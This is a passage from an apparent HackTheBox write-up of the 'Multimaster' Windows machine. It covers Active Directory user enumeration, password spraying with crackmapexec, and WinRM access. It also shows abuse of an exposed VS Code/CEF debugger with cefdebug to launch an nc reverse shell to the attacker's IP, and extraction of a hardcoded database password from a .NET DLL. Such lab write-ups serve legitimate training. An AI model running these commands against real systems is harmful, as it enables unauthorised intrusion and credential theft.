[+] Found account [01602]  MEGACORP\test                               
[+] Found account [02101]  MEGACORP\dai                                
[+] Found account [02102]  MEGACORP\svc-sql                              
[+] Found account [03101]  MEGACORP\SQLServer2005SQLBrowserUser$MULTIMASTER                              
[+] Found account [03102]  MEGACORP\sbauer                              
[+] Found account [03103]  MEGACORP\okent                              
[+] Found account [03104]  MEGACORP\ckane                              
[+] Found account [03105]  MEGACORP\kpage                              
[+] Found account [03106]  MEGACORP\james                              
[+] Found account [03107]  MEGACORP\cyork                              
[+] Found account [03108]  MEGACORP\rmartin                              
[+] Found account [03109]  MEGACORP\zac                                
[+] Found account [03110]  MEGACORP\jorden                              
[+] Found account [03111]  MEGACORP\alyx                               
[+] Found account [03112]  MEGACORP\ilee                               
[+] Found account [03113]  MEGACORP\nbourne                              
[+] Found account [03114]  MEGACORP\zpowers                              
[+] Found account [03115]  MEGACORP\aldom                              
[+] Found account [03116]  MEGACORP\jsmmons                              
[+] Found account [03117]  MEGACORP\pmartin                              
[+] Found account [03119]  MEGACORP\Developers
```

Users.txt

```
┌──(root㉿kali)-[~/Desktop]
└─# awk -F'\\\\' '/MEGACORP/ {gsub(/\[.*\]/,"",$2); print $2}' tmp.txt | sort -u > users.txt
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop]
└─# cat users.txt 

Administrator                              
aldom                              
alice                              
Allowed RODC Password Replication Group                              
alyx                               
andrew                              
Cert Publishers                              
ckane                              
Cloneable Domain Controllers                              
cyork                              
dai                                
DefaultAccount                              
Denied RODC Password Replication Group                              
Developers
DnsAdmins                              
DnsUpdateProxy                              
Domain Admins                              
Domain Computers                              
Domain Controllers                              
Domain Guests                              
Domain Users                              
Enterprise Admins                              
Enterprise Key Admins                              
Group Policy Creator Owners                              
Guest                              
ilee                               
james                              
jorden                              
jsmmons                              
Key Admins                              
kpage                              
krbtgt                              
lana                               
MULTIMASTER$                              
nbourne                              
okent                              
pmartin                              
Privileged IT Accounts                              
Protected Users                              
RAS and IAS Servers                              
Read-only Domain Controllers                              
rmartin                              
sbauer                              
Schema Admins                              
SQLServer2005SQLBrowserUser$MULTIMASTER                              
svc-nas                              
svc-sql                              
test                               
tushikikatomo                              
zac                                
zpowers                              

```

password.list

```
password1
finance1
banking1
?
```

```
root@kali# crackmapexec smb 10.10.10.179 -u dom_users -p passwords --continue-on-success
SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP) (signing:True) (SMBv1:True)
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\MULTIMASTER$:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\MULTIMASTER$:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\MULTIMASTER$:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\DnsAdmins:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\DnsAdmins:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\DnsAdmins:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\DnsUpdateProxy:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\DnsUpdateProxy:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\DnsUpdateProxy:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\svc-nas:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\svc-nas:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\svc-nas:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\Privileged IT Accounts:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\Privileged IT Accounts:finance1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\Privileged IT Accounts:banking1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\tushikikatomo:password1 STATUS_LOGON_FAILURE 
SMB         10.10.10.179    445    MULTIMASTER      [+] MEGACORP\tushikikatomo:finance1 
SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP\tushikikatomo:banking1 STATUS_ACCESS_DENIED 
...[snip]...
```

There’s one success: `MEGACORP\tushikikatomo:finance1`.

With these new creds, I have access to three shares:

# Shell as alcibiades

### WinRM

I also have access to a shell over WinRM:

```
┌──(root㉿kali)-[~/Desktop]
└─# evil-winrm-py -i MEGACORP -u tushikikatomo -p finance1 -i 10.129.95.200 
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to '10.129.95.200:5985' as 'tushikikatomo'
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
evil-winrm-py PS C:\Users\alcibiades\Documents> cd ../Desktop
evil-winrm-py PS C:\Users\alcibiades\Desktop> type user.txt
4c1ad65c4429fa87e8463cfaf2ff03a1
evil-winrm-py PS C:\Users\alcibiades\Desktop>

```

# Shell as tushikikatomo

### Enum

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Enumation-inetpub" >}} In the  C :/ , using the  ls -force  to show , and the inetpub is meaning the web server , but using the  ls -r  that I don't get much interesting things

{{< /toggle >}}

```
evil-winrm-py PS C:\> ls -force


    Directory: C:\


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
d--hs-         1/9/2020  12:03 PM                $Recycle.Bin                                                           
d--hs-        7/19/2021   1:08 AM                Config.Msi                                                             
d-----        9/25/2019  12:41 PM                DFSRoots                                                               
d--hsl        9/25/2019  10:53 AM                Documents and Settings                                                 
d-----         1/7/2020   7:23 PM                inetpub                                                                
d-----        9/25/2019   5:01 AM                PerfLogs                                                               
d-r---        7/19/2021   1:07 AM                Program Files                                                          
d-----         1/9/2020   1:18 PM                Program Files (x86)                                                    
d--h--         1/7/2020   7:45 PM                ProgramData                                                            
d--hs-        9/25/2019  10:53 AM                Recovery                                                               
d--hs-        9/25/2019   6:32 AM                System Volume Information                                              
d-r---         1/9/2020   5:14 PM                Users                                                                  
d-----        7/19/2021   1:29 AM                Windows                                                                
-arhs-       11/20/2016   4:42 PM         389408 bootmgr                                                                
-a-hs-        7/16/2016   6:18 AM              1 BOOTNXT                                                                
-a-hs-        5/14/2026   2:34 AM      738197504 pagefile.sys    
```

```
evil-winrm-py PS C:\inetpub> ls -r


    Directory: C:\inetpub


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
d-----         1/7/2020   7:23 PM                custerr                                                                
d-----         1/8/2020   9:36 PM                history                                                                
d-----         1/7/2020   7:30 PM                logs                                                                   
d-----         1/7/2020   7:23 PM                temp                                                                   
d-----         1/7/2020   9:28 PM                wwwroot                                                                


    Directory: C:\inetpub\custerr


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
d-----         1/7/2020   7:23 PM                en-US                                                                  


    Directory: C:\inetpub\custerr\en-US


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-a----         1/7/2020   7:23 PM           1297 401-1.htm                                                              
-a----         1/7/2020   7:23 PM           1415 401-2.htm                                                              
-a----         1/7/2020   7:23 PM           1383 401-3.htm                                                              
-a----         1/7/2020   7:23 PM           1457 401-4.htm                                                              
-a----         1/7/2020   7:23 PM           1380 401-5.htm                                                              
-a----         1/7/2020   7:23 PM           1293 401.htm                                                                
-a----         1/7/2020   7:23 PM           1288 403-1.htm                                                              
-a----         1/7/2020   7:23 PM           1336 403-10.htm                                                             
-a----         1/7/2020   7:23 PM           1257 403-11.htm                                                             
-a----         1/7/2020   7:23 PM           1467 403-12.htm                                                             
-a----         1/7/2020   7:23 PM           1409 403-13.htm                                                             
-a----         1/7/2020   7:23 PM           1242 403-14.htm                                                             
-a----         1/7/2020   7:23 PM           1354 403-15.htm                                                             
-a----         1/7/2020   7:23 PM           1402 403-16.htm                                                             
-a----         1/7/2020   7:23 PM           1374 403-17.htm                                                             
-a----         1/7/2020   7:23 PM           1349 403-18.htm                                                             
-a----         1/7/2020   7:23 PM           1337 403-19.htm                                                             
-a----         1/7/2020   7:23 PM           1384 403-2.htm                                                              
-a----         1/7/2020   7:23 PM           1321 403-3.htm                                                              
-a----         1/7/2020   7:23 PM           1258 403-4.htm                                                              
-a----         1/7/2020   7:23 PM           1377 403-5.htm                                                              
-a----         1/7/2020   7:23 PM           1367 403-6.htm                                                              
-a----         1/7/2020   7:23 PM           1410 403-7.htm                                                              
-a----         1/7/2020   7:23 PM           1347 403-8.htm                                                              
-a----         1/7/2020   7:23 PM           1283 403-9.htm                                                              
-a----         1/7/2020   7:23 PM           1233 403.htm                                                                
-a----         1/7/2020   7:23 PM           1358 404-1.htm                                                              
-a----         1/7/2020   7:23 PM           1220 404-10.htm                                                             
-a----         1/7/2020   7:23 PM           1201 404-11.htm                                                             
-a----         1/7/2020   7:23 PM           1195 404-12.htm                                                             
-a----         1/7/2020   7:23 PM           1227 404-13.htm                                                             
-a----         1/7/2020   7:23 PM           1191 404-14.htm                                                             
-a----         1/7/2020   7:23 PM           1215 404-15.htm                                                             
-a----         1/7/2020   7:23 PM           1334 404-2.htm                                                              
-a----         1/7/2020   7:23 PM           1469 404-3.htm                                                              
-a----         1/7/2020   7:23 PM           1368 404-4.htm                                                              
-a----         1/7/2020   7:23 PM           1180 404-5.htm                                                              
-a----         1/7/2020   7:23 PM           1171 404-6.htm                                                              
-a----         1/7/2020   7:23 PM           1202 404-7.htm                                                              
-a----         1/7/2020   7:23 PM           1187 404-8.htm                                                              
-a----         1/7/2020   7:23 PM           1205 404-9.htm                                                              
-a----         1/7/2020   7:23 PM           1245 404.htm                                                                
-a----         1/7/2020   7:23 PM           1293 405.htm                                                                
-a----         1/7/2020   7:23 PM           1346 406.htm                                                                
-a----         1/7/2020   7:23 PM           1505 412.htm                                                                
-a----         1/7/2020   7:23 PM           5735 500-100.asp                                                            
-a----         1/7/2020   7:23 PM           1270 500-13.htm                                                             
-a----         1/7/2020   7:23 PM           1299 500-14.htm                                                             
-a----         1/7/2020   7:23 PM           1285 500-15.htm                                                             
-a----         1/7/2020   7:23 PM           1324 500-16.htm                                                             
-a----         1/7/2020   7:23 PM           1329 500-17.htm                                                             
-a----         1/7/2020   7:23 PM           1332 500-18.htm                                                             
-a----         1/7/2020   7:23 PM           1272 500-19.htm                                                             
-a----         1/7/2020   7:23 PM           1208 500.htm                                                                
-a----         1/7/2020   7:23 PM           1508 501.htm                                                                
-a----         1/7/2020   7:23 PM           1477 502.htm                                                                


    Directory: C:\inetpub\temp


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
d-----        5/14/2026   2:34 AM                appPools                                                               
d-----         1/7/2020   7:30 PM                IIS Temporary Compressed Files                                         


Access to the path 'C:\inetpub\history' is denied.
Access to the path 'C:\inetpub\logs' is denied.
Access to the path 'C:\inetpub\temp\appPools' is denied.
Access to the path 'C:\inetpub\temp\IIS Temporary Compressed Files' is denied.
Access to the path 'C:\inetpub\wwwroot' is denied.

```

After looking around the users home directory, I turned to looking at installed programs, and in enumerating them, one jumped out as not normal on HTB machines:

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Enumation-program-files" >}} The Microsoft Visual Studio 10.0  and Microsoft VS Code  vscode should not be in the HTB machine

{{< /toggle >}}

```
evil-winrm-py PS C:\Program Files (x86)> dir


    Directory: C:\Program Files (x86)


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
d-----        7/16/2016   6:23 AM                Common Files                                                           
d-----         1/9/2020   2:39 PM                Internet Explorer                                                      
da----         1/9/2020   1:17 PM                Microsoft SQL Server                                                   
d-----         1/7/2020   7:26 PM                Microsoft Visual Studio 10.0                                           
d-----         1/7/2020   7:27 PM                Microsoft.NET                                                          
d-----         1/7/2020   9:43 PM                Reference Assemblies                                                   
d-----         1/9/2020   2:39 PM                Windows Defender                                                       
d-----         1/9/2020   2:39 PM                Windows Mail                                                           
d-----         1/9/2020   2:39 PM                Windows Media Player                                                   
d-----        7/16/2016   6:23 AM                Windows Multimedia Platform                                            
d-----        7/16/2016   6:23 AM                Windows NT                                                             
d-----         1/9/2020   2:39 PM                Windows Photo Viewer                                                   
d-----        7/16/2016   6:23 AM                Windows Portable Devices                                               
d-----        7/16/2016   6:23 AM                WindowsPowerShell                                                      


evil-winrm-py PS C:\Program Files (x86)> dir ../Program Files
Cannot find path 'C:\Program' because it does not exist.
evil-winrm-py PS C:\Program Files (x86)> dir ../'Program Files'


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
d-----        9/25/2019  10:59 AM                Common Files                                                           
d-----         1/9/2020   2:39 PM                Internet Explorer                                                      
d-----         1/7/2020   9:40 PM                Microsoft                                                              
da----         1/7/2020   7:47 PM                Microsoft SQL Server                                                   
d-----         1/7/2020   7:26 PM                Microsoft Visual Studio 10.0                                           
da----         1/9/2020   3:18 AM                Microsoft VS Code                                                      
d-----         1/7/2020   7:27 PM                Microsoft.NET                                                          
d-----         1/7/2020   9:43 PM                Reference Assemblies                                                   
d-----        7/19/2021   1:07 AM                VMware                                                                 
d-r---         1/9/2020   2:46 PM                Windows Defender                                                       
d-----         1/9/2020   2:39 PM                Windows Mail                                                           
d-----         1/9/2020   2:39 PM                Windows Media Player                                                   
d-----        7/16/2016   6:23 AM                Windows Multimedia Platform                                            
d-----        7/16/2016   6:23 AM                Windows NT                                                             
d-----         1/9/2020   2:39 PM                Windows Photo Viewer                                                   
d-----        7/16/2016   6:23 AM                Windows Portable Devices                                               
d-----        7/16/2016   6:23 AM                WindowsPowerShell        
```

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-vscode-debugger" >}} The developer has made the mistake of leaving the debugger enabled at some point, so I am abuing the ws lile ws://127.0.0.1:45762/0a4b77e5-bf1a-425d-a05b-ace2e9e07c91 to do the any command execute to have the shell. Debuggers are designed to give developers **total runtime control** (read memory, evaluate code, control execution flow), so any exposed debugger port essentially equals **unauthenticated RCE** regardless of the language or protocol behind it by cefdebug.exe.

{{< /toggle >}}

[This Tweet](https://twitter.com/taviso/status/1182418347759030272) from Travis Ormandy explains the situation:

> It seems like everyone shipping Electron or CEF has made the mistake of leaving the debugger enabled at some point. I made a tiny command line application you can use to check. 🐞 <https://t.co/BIceqkcYJq>

{{< toggle "Tag 🏷️" >}}

{{< tag "Port139-135-SMB-linux-windows-share-smbserver.py" >}} Using the smbserver.py to upload and download the file with smbsare

{{< /toggle >}}

locate the script

```
┌──(root㉿kali)-[~/Desktop]
└─# locate smbserver.py
/home/kali/.cache/uv/archive-v0/YT8sqWT3bWxNQNAsKLlIE/impacket/smbserver.py
/home/kali/.cache/uv/archive-v0/YT8sqWT3bWxNQNAsKLlIE/impacket-0.14.0.dev0+20260226.31512.9d3d86ea.data/scripts/smbserver.py
/home/kali/.cache/uv/git-v0/checkouts/66325c558242afca/9d3d86ea/build/lib/impacket/smbserver.py
/home/kali/.cache/uv/git-v0/checkouts/66325c558242afca/9d3d86ea/build/scripts-3.13/smbserver.py
/home/kali/.cache/uv/git-v0/checkouts/66325c558242afca/9d3d86ea/examples/smbserver.py
/home/kali/.cache/uv/git-v0/checkouts/66325c558242afca/9d3d86ea/impacket/smbserver.py
/home/kali/.cache/uv/git-v0/checkouts/66325c558242afca/9d3d86ea/tests/SMB_RPC/test_smbserver.py
/opt/py_env/bin/smbserver.py
/opt/py_env/lib/python3.13/site-packages/impacket/smbserver.py
/root/.cache/uv/archive-v0/Ps3A_H_DHWFH-YB5Uitii/impacket/smbserver.py
/root/.cache/uv/archive-v0/Ps3A_H_DHWFH-YB5Uitii/impacket-0.13.0.data/scripts/smbserver.py
/root/.cache/uv/environments-v2/pygpoabuse-31dbfe2752820717/bin/smbserver.py
/root/.cache/uv/environments-v2/pygpoabuse-31dbfe2752820717/lib/python3.13/site-packages/impacket/smbserver.py
/root/.cache/uv/sdists-v9/pypi/impacket/0.13.0/kj1jCmfux63wv7t8MP1YO/src/build/lib/impacket/smbserver.py
/root/.cache/uv/sdists-v9/pypi/impacket/0.13.0/kj1jCmfux63wv7t8MP1YO/src/build/scripts-3.13/smbserver.py
/root/.cache/uv/sdists-v9/pypi/impacket/0.13.0/kj1jCmfux63wv7t8MP1YO/src/examples/smbserver.py
/root/.cache/uv/sdists-v9/pypi/impacket/0.13.0/kj1jCmfux63wv7t8MP1YO/src/impacket/smbserver.py
/root/.cache/uv/sdists-v9/pypi/impacket/0.13.0/kj1jCmfux63wv7t8MP1YO/src/tests/SMB_RPC/test_smbserver.py
/usr/lib/python3/dist-packages/impacket/smbserver.py
/usr/lib/python3/dist-packages/scapy/layers/smbserver.py
/usr/share/doc/python3-impacket/examples/smbserver.py

```

```
┌──(root㉿kali)-[~/Desktop]
└─# sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py  share ./ -smb2support -user pwned -password pwned 

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 


```

verify the cred in windows

```
evil-winrm-py PS C:\ProgramData> net use \\10.10.14.45\share /user:pwned pwned
The command completed successfully.
```

if failed

```
evil-winrm-py PS C:\ProgramData> net use X: \\10.10.14.45\share /user:pwned pwned
```

upload it

```
wget https://github.com/taviso/cefdebug/releases/download/v0.2/cefdebug.zip 
```

```
unzip cefdebug.zip 
```

```
evil-winrm-py PS C:\ProgramData> copy \\10.10.14.45\share\cefdebug.exe C:\ProgramData\cefdebug.exe
evil-winrm-py PS C:\ProgramData> ls cefdebug.exe


    Directory: C:\ProgramData


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
-a----        10/7/2019   1:06 PM         259584 cefdebug.exe                                                           


```

```
evil-winrm-py PS C:\ProgramData> .\cefdebug.exe
[2026/05/14 03:19:26:4123] U: There are 3 tcp sockets in state listen.
[
2026/05/14 03:19:46:4748] U: There were 1 servers that appear to 
be
 CEF debugge
rs.
                                                                                                                                                                                                                                            
[
2026/05/14 03:19:46:4748] U:
 
ws://127.0.0.1:45762/0a
4
b77e5-bf1a-425d-a05b-ace2e9e07c91

```

```
evil-winrm-py PS C:\ProgramData> .\cefdebug.exe  --code "process.version" --url 'ws://127.0.0.1:45762/0a4b77e5-bf1a-425d-a05b-ace2e9e07c91'
[2026/05/14 03:21:21:6277] U: >>> process.version
[2026/05/14 03:21:21:6277] U: <<< v10.
11.0
                                  
```

```
evil-winrm-py PS C:\ProgramData> .\cefdebug.exe  --code "whoami" --url 'ws://127.0.0.1:45762/0a4b77e5-bf1a-425d-a05b-ace2e9e07c91'
[2026/05/14 03:21:47:0806] U: >>> whoami
[2026/05/14 03:21:47:0806] U: <<
<
 
R
e
f
e
r
e
n
c
e
E
r
r
o
r
:
 
w
h
o
a
m
i
 
i
s
 
n
o
t
 
d
e
f
i
n
e
d

                                                                                                                                                                                                                                            

a
t
 
e
v
a
l
 
(
e
v
a
l
 
a
t
 
<
a
n
o
n
y
m
o
u
s
>
 
(
:
1
:
1
)
,
 
<
a
n
o
n
y
m
o
u
s
>
:
1
:
1
)

                                                                                                                                                                                                                                            

a
t
 
<
a
n
o
n
y
m
o
u
s
>
:
1
:
1

           
```

Shell

```
┌──(root㉿kali)-[~/Desktop]
└─# locate nc.exe   
/opt/payloads/SecLists/Web-Shells/FuzzDB/nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe                                                                  
┌──(root㉿kali)-[~/Desktop]
└─# mv /usr/share/windows-resources/binaries/nc.exe .                           
                                                                                                                    
┌──(root㉿kali)-[~/Desktop]
└─# sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py  share ./ -smb2support -user pwned -password pwned

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 


```

backup

```
net use X: \\10.10.14.45\share /user:pwned pwned
```

```
evil-winrm-py PS C:\Users\alcibiades\Documents> net use \\10.10.14.45\share /user:pwned pwned
The command completed successfully.

evil-winrm-py PS C:\Users\alcibiades\Documents> copy \\10.10.14.45\share\nc32.exe C:\ProgramData\nc32.exe

```

```
evil-winrm-py PS C:\ProgramData> .\cefdebug.exe --code "process.mainModule.require('child_process').exec('C:\\programdata\\nc32.exe 10.10.14.45 443 -e cmd')"  --url 'ws://127.0.0.1:10925/4bddeff7-c6f9-4f5e-912d-2de1575378ba'
```

```
root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.179.
Ncat: Connection from 10.10.10.179:50159.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Program Files\Microsoft VS Code>whoami
megacorp\cyork
```

# Priv: cyork –> sbauer

### Enumeration

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Enumation-inetpub-dataleak" >}} cyork does have access to the web directory. I missed it the first time I was there, but eventually I noticed a very custom dll in  \inetpub\wwwroot\bin\ : that is MultimasterAPI.dll

{{< /toggle >}}

```
C:\inetpub\wwwroot\bin>dir
 Volume in drive C has no label.
 Volume Serial Number is 5E12-F84E                                                                                
                                                         
 Directory of C:\inetpub\wwwroot\bin
                                                         
01/07/2020  10:28 PM    <DIR>          .
01/07/2020  10:28 PM    <DIR>          ..
02/21/2013  08:13 PM           102,912 Antlr3.Runtime.dll 
02/21/2013  08:13 PM           431,616 Antlr3.Runtime.pdb 
05/24/2018  01:08 AM            40,080 Microsoft.CodeDom.Providers.DotNetCompilerPlatform.dll
07/24/2012  11:18 PM            45,416 Microsoft.Web.Infrastructure.dll
01/09/2020  05:13 AM            13,824 MultimasterAPI.dll
01/09/2020  05:13 AM            28,160 MultimasterAPI.pdb 
02/17/2018  09:14 PM           664,576 Newtonsoft.Json.dll
01/07/2020  10:28 PM    <DIR>          roslyn
11/28/2018  12:30 AM           178,808 System.Net.Http.Formatting.dll
11/28/2018  12:28 AM            27,768 System.Web.Cors.dll
01/27/2015  03:34 PM           139,976 System.Web.Helpers.dll
11/28/2018  12:31 AM            39,352 System.Web.Http.Cors.dll
11/28/2018  12:31 AM           455,096 System.Web.Http.dll
01/31/2018  11:49 PM            77,520 System.Web.Http.WebHost.dll
01/27/2015  03:32 PM           566,472 System.Web.Mvc.dll 
02/11/2014  02:56 AM            70,864 System.Web.Optimization.dll
01/27/2015  03:32 PM           272,072 System.Web.Razor.dll
01/27/2015  03:34 PM            41,672 System.Web.WebPages.Deployment.dll
01/27/2015  03:34 PM           211,656 System.Web.WebPages.dll
01/27/2015  03:34 PM            39,624 System.Web.WebPages.Razor.dll
07/17/2013  04:33 AM         1,276,568 WebGrease.dll
              20 File(s)      4,724,032 bytes
               3 Dir(s)  19,370,094,592 bytes free
```

I’ll copy `MultimasterAPI.dll` back to my machine over SMB.

### MultimasterAPI.dll

{{< toggle "Tag 🏷️" >}}

{{< tag "reverse-engine-dll-strings" >}} The dll file is a .NET binary, But before opening it in DNSpy, I’ll run  strings . It’s important to remember for Windows binaries to run with and without `-el` to capture the 16 bit character strings. There’s one that jumps out when I run with `-el`:

{{< /toggle >}}

The file is a .NET binary:

```
root@kali# file MultimasterAPI.dll 
MultimasterAPI.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

But before opening it in DNSpy, I’ll run `strings`. It’s important to remember for Windows binaries to run with and without `-el` to capture the 16 bit character strings. There’s one that jumps out when I run with `-el`:

The `-e` flag sets encoding, `-l` specifies **16-bit little-endian** — which is how Windows/.NET stores Unicode strings internally. Running without it would have **missed the connection string entirely**.

```
strings -el MultimasterAPI.dll
```

.NET stores most string literals as **UTF-16LE** internally — so hardcoded values like connection strings, passwords, and API keys are almost always invisible without `-el`.

```
server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;
```

That looks like a database connection string.

### Test Creds

```
crackmapexec smb 10.129.95.200 -u dom_users -p 'D3veL0pM3nT!' --continue-on-success
```

```
┌──(root㉿kali)-[~/Desktop]
└─# crackmapexec smb 10.129.95.200 -u users.txt -p 'D3veL0pM3nT!' --continue-on-success 
SMB         10.129.95.200   445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\Administrator:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\aldom:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\alice:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\Allowed RODC Password Replication Group:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\alyx:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\andrew:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\Cert Publishers:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\Cloneable Domain Controllers:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\cyork:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\dai:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\DefaultAccount:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\Denied RODC Password Replication Group:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\Developers:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\DnsAdmins:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\DnsUpdateProxy:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\Domain Admins:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\Domain Computers:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\Domain Controllers:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\Domain Guests:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\Domain Users:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\Enterprise Admins:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\Enterprise Key Admins:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\Group Policy Creator Owners:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\Guest:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\ilee:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\james:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\jorden:D3veL0pM3nT! STATUS_LOGON_FAILURE 
SMB         10.129.95.200   445    MULTIMASTER      [-] MEGACORP.LOCAL\jsmmons:D3veL0pM3nT! STATUS_LOGON_FAILURE 
